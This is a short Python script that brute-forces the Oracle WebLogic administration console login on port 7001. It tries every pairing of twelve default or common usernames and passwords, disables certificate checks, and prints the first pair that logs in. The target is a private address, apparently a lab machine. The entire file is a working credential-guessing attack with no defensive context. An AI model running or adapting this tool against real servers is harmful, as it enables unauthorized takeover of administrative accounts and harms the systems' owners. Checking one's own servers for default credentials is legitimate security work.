import requests
requests.packages.urllib3.disable_warnings()
def run(url):
    pwddict = ['WebLogic', 'weblogic', 'Oracle@123', 'password', 'system', 'Administrator', 'admin', 'security', 'joe', 'wlcsystem', 'wlpisystem', 'weblogic123']
    for user in pwddict:
        for pwd in pwddict:
            data = {
                'j_username':user,
                'j_password':pwd,
                'j_character_encoding':'UTF-8'
            }
            req = requests.post(url+':7001/console/j_security_check', data=data, allow_redirects=False, verify=False, timeout=3)
            
            if req.status_code == 302 and 'console' in req.text and 'LoginForm.jsp' not in req.text:
                return 'WebLogic username: '+user+'  password: '+pwd
    return False

if __name__ == '__main__':
    print(run("http://192.168.27.128"))